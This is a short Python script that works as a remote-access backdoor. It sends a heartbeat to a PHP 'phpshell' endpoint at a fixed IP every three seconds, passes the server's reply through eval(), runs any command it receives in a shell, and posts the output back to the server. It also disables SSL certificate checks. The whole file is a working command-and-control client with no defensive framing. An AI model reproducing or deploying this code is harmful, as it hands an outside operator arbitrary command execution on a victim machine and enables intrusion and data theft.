import httplib2
import json
import os
import urllib
import subprocess
import time
from urllib import request
import json
http = httplib2.Http(".cache",  disable_ssl_certificate_validation=True)


############################################################
#---  Heart-Beat LOOP BLOCK
def beat():
	global content
	global status
	global http
	status = 1
	while(1):
		time.sleep(3)
		body = {'status':status}
		try:
			content = http.request("http://192.168.1.75/phpshell/postscript/index.php", method="POST", headers={'Content-type': 'application/x-www-form-urlencoded'}, body=urllib.parse.urlencode(body) )[1]
			content = content.decode("utf-8")
			rec_pkt = eval(content)
			rec_pkt = rec_pkt['data']
			print("Received reply from Server :: ",content)
			cmd = rec_pkt.split('|')
			cmd1 = cmd[1]
			if cmd[0] == "pass":
				proc = subprocess.Popen([cmd1], stdout=subprocess.PIPE, shell=True)
				(output, err1) = proc.communicate()
				output = output.decode('utf-8')
				print("This is the OutPut", output)
				body = {'resp':output}
				content = http.request("http://192.168.1.75/phpshell/postscript/index.php", method="POST", headers={'Content-type': 'application/x-www-form-urlencoded'}, body=urllib.parse.urlencode(body) )[1]
		except Exception as e:           
			print(e)                                                                                                                
		#	#pass 
						
#---  END-BLOCK
		
############################################################
#---   Main BLOCK
def main():
	beat()
	
##MAIN FUNCTION
if __name__ == '__main__':
	main()
#---   END-BLOCK
